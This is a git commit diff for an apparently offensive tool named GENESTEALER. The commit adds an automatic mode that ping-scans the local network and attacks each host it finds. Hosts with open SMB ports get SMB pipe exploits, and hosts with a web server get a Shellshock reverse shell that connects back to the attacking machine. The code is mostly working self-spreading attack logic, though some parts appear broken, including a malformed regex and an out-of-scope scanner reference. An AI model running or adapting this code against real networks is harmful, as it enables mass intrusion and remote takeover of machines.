1c9a5832f1e7fa48e273fa2a7a2238195d281497
Marcus <chinegro21@gmail.com>
2020-01-14 07:24:47 -0500

    Auto attack logic complete

--- main.py
+++ main.py
@@ -10,10 +10,39 @@ from scanner import scanner
 from shocker import shockshell
 from subprocess import check_output
 
-# SMB ports are 139 & 445, so look for a 3 digit number
+# SMB ports are 139 & 445, so look for 3 digit open ports
 smb_finder = re.compile("([0-9]{3}\/tcp)\s+(open)")
-# Shellshock needs port 80
+# Shellshock needs port 80, so look for a 2 digit port thats open
 web_finder = re.compile("([0-9]{2}\/tcp)\s+(open)")
+
+def attack(ip):
+    print("Scanning target with nmap...")
+    vic_info = nmap.identify_ports(str(ip))
+    pprint(vic_info)
+    if len(smb_finder.findall(vic_info)) == 2:
+        # Don't need to check what ports are since we only scan for 3
+        print(f"Smb ports running on {ip}!!")
+        # Run smbclient to enumerate pipes
+        pipe_detector = re.compile('(A-z)+')
+        smbclient_cmd = ['smbclient', '-L', f'\\\\{ip}']
+        smbclient_cmd_alt = ['/tmp/.smbclient', '-L', f'\\\\{ip}']
+        try:
+            pipe_names = check_output(smbclient_cmd)
+        except:
+            pipe_names = check_output(smbclient_cmd_alt)
+        finally:
+            pipes = pipe_detector.findall(pipe_names)
+        for pipe in pipes:
+            try:
+                exploit(ip, pipe)
+            except:
+                continue
+    elif len(web_finder.findall(vic_info)) == 1:
+        print(f"Web server found running on {ip}!!")
+        shockshell('reverse', ip, 40000, nmap.get_self_ip())
+    else:
+        print("Necessary ports not found on target")
+        print(f"Attack on {ip} failed :(")
 
 def main():
     parser = argparse.ArgumentParser(prog="GENESTEALER")
@@ -33,42 +62,16 @@ def main():
     else:
         nmap = scanner()
         if args.mode == 'manual':
-            for victim_ip in args.target:
-                print(f"Manual attack started against {victim_ip}")
-                curr_box = nmap.get_self_ip()
-                # print scan output
-                print("Scanning target with nmap...")
-                vic_info = nmap.identify_ports(str(victim_ip))
-                pprint(vic_info)
-                if len(smb_finder.findall(vic_info)) == 2:
-                    # Don't need to check the ports since we only scan for 3
-                    print(f"Smb ports running on {victim_ip}!!")
-                    # Run smbclient to enumerate pipes
-                    pipe_detector = re.compile('(A-z)+')
-                    smbclient_cmd = ['smbclient', '-L', f'\\\\{victim_ip}']
-                    smbclient_cmd_alt = ['/tmp/.smbclient', '-L', f'\\\\{victim_ip}']
-                    try:
-                        pipe_names = check_output(smbclient_cmd)
-                    except:
-                        pipe_names = check_output(smbclient_cmd_alt)
-                    finally:
-                        pipes = pipe_detector.findall(pipe_names)
-                    for pipe in pipes:
-                        try:
-                            exploit(victim_ip, pipe)
-                        except:
-                            continue
-                elif len(web_finder.findall(vic_info)) == 1:
-                    print(f"Web server found running on {victim_ip}!!")
-                    shockshell('reverse', victim_ip, 40000, curr_box)
-                else:
-                    print("Necessary ports not found on target")
-                    print(f"Attack on {victim_ip} failed :(")
+            for victim in args.target:
+                print(f"Manual attack started against {victim}")
+                attack(victim)
         else:
             print("Auto attack against network")
             curr_box = nmap.get_self_ip()
             print("Identifying targets...")
-            pass
+            victims = nmap.ping_scan(curr_box)
+            for victim in victims:
+                attack(victim)
 
 if __name__ == '__main__':
     main()
